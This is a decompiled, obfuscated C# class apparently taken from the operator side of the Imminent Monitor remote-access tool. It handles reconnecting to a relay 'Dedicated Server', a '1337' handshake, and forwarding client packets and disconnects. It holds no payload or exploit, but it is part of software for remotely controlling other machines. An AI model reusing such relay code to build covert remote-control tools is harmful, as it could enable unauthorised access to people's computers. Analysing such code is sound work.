// Decompiled with JetBrains decompiler
// Type: GClass39
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;

public sealed class GClass39
{
  public string string_0;
  public string string_1;
  public string string_2;
  private GClass18 gclass18_0;
  public bool bool_0;

  public GClass39(string string_3, ushort ushort_0, string string_4)
  {
    this.bool_0 = true;
    this.string_0 = string_3;
    this.string_1 = Conversions.ToString((uint) ushort_0);
    this.string_2 = string_4;
    if (this.vmethod_0() != null)
    {
      this.vmethod_0().method_32();
      this.vmethod_1((GClass18) null);
    }
    this.vmethod_1(new GClass18());
    this.vmethod_0().method_19((int) ushort.MaxValue);
    this.vmethod_0().method_13(true);
    new Thread(new ThreadStart(this.method_2)).Start();
  }

  public virtual GClass18 vmethod_0() => this.gclass18_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public virtual void vmethod_1(GClass18 gclass18_1)
  {
    GClass18.GDelegate7 gdelegate7_1 = new GClass18.GDelegate7(this.method_3);
    if (this.gclass18_0 != null)
      this.gclass18_0.method_1(gdelegate7_1);
    this.gclass18_0 = gclass18_1;
    if (this.gclass18_0 == null)
      return;
    this.gclass18_0.method_0(gdelegate7_1);
  }

  public void method_0()
  {
    this.bool_0 = false;
    if (this.vmethod_0() == null)
      return;
    this.vmethod_0().method_32();
  }

  private bool method_1() => this.vmethod_0() != null && this.vmethod_0().method_25() && this.vmethod_0().socket_0 != null && this.vmethod_0().socket_0.Connected;

  private void method_2()
  {
    while (this.bool_0)
    {
      if (!this.method_1())
      {
        Class97.gclass2_0.method_0(string.Format("[Network] Attempting to connect to Dedicated Server {0}:{1}...", (object) this.string_0, (object) this.string_1), Class97.gclass2_0.textStyle_2);
        try
        {
          foreach (GClass18 gclass18 in new List<GClass18>((IEnumerable<GClass18>) Class97.list_0))
          {
            GClass39.Class155 class155_0 = new GClass39.Class155(class155_0);
            class155_0.gclass18_0 = gclass18;
            if (class155_0.gclass18_0.method_12())
              Class97.formMain_0.vmethod_0().Invoke((Delegate) new Delegate0(class155_0._Lambda\u0024__131));
          }
        }
        finally
        {
          List<GClass18>.Enumerator enumerator;
          enumerator.Dispose();
        }
        this.vmethod_0().int_1 = 0;
        this.vmethod_0().int_2 = 0;
        this.vmethod_0().int_3 = 0;
        this.vmethod_0().int_4 = 0;
        this.vmethod_0().method_15(Encoding.UTF8.GetBytes("1337"));
        this.vmethod_0().method_33(this.string_0, Conversions.ToUShort(this.string_1));
      }
      Thread.Sleep(10000);
    }
  }

  private void method_3(GClass18 gclass18_1, bool bool_1)
  {
    if (!bool_1)
      return;
    gclass18_1.method_15(Encoding.UTF8.GetBytes(this.string_2));
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_4(gclass18_1, new object[2]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.ServerInitialize,
      (object) this.string_2
    });
    Class97.gclass2_0.method_0("[Network] Dedicated server connection established", Class97.gclass2_0.textStyle_1);
  }

  public void method_4(
    GClass18 gclass18_1,
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader packetHeader_0,
    object[] object_0)
  {
    GClass39.Class156 class156 = new GClass39.Class156();
    class156.gclass39_0 = this;
    class156.object_0 = object_0;
    try
    {
      switch (packetHeader_0)
      {
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.ClientDisconnect:
          Class97.formMain_0.vmethod_0().Invoke((Delegate) new Delegate0(class156._Lambda\u0024__132));
          break;
        case dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.ClientPacket:
          if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(class156.object_0[2], (object) 0, false))))
          {
            Class97.gclass21_0.method_4(this.method_5(Conversions.ToString(class156.object_0[1])), (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader) Conversions.ToByte(class156.object_0[2]), ((IEnumerable<object>) class156.object_0).Skip<object>(2).ToArray<object>());
            break;
          }
          Class97.gclass21_0.method_4(gclass18_1, (dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader) Conversions.ToByte(class156.object_0[2]), ((IEnumerable<object>) class156.object_0).Skip<object>(2).ToArray<object>());
          break;
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception = ex;
      if (!exception.Message.Contains("disposed"))
      {
        Class97.smethod_24(exception.GetType().ToString(), exception.StackTrace);
        Class97.gclass2_0.method_0("[Dedicated Server Error] " + exception.Message + exception.StackTrace, Class97.gclass2_0.textStyle_3);
      }
      ProjectData.ClearProjectError();
    }
  }

  public GClass18 method_5(string string_3)
  {
    lock (Class97.list_0)
    {
      try
      {
        foreach (GClass18 gclass18 in new List<GClass18>((IEnumerable<GClass18>) Class97.list_0))
        {
          if (gclass18.method_20() != null && Operators.CompareString(gclass18.method_20().string_0, string_3, false) == 0)
          {
            gclass18.method_7(false);
            return gclass18;
          }
        }
      }
      finally
      {
        List<GClass18>.Enumerator enumerator;
        enumerator.Dispose();
      }
      return (GClass18) null;
    }
  }

  internal sealed class Class155
  {
    public GClass18 gclass18_0;

    public Class155(GClass39.Class155 class155_0)
    {
      if (class155_0 == null)
        return;
      this.gclass18_0 = class155_0.gclass18_0;
    }

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__131() => Class97.gclass21_0.method_8(this.gclass18_0);
  }

  internal sealed class Class156
  {
    public object[] object_0;
    public GClass39 gclass39_0;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__132() => Class97.gclass21_0.method_8(this.gclass39_0.method_5(Conversions.ToString(this.object_0[1])));
  }
}
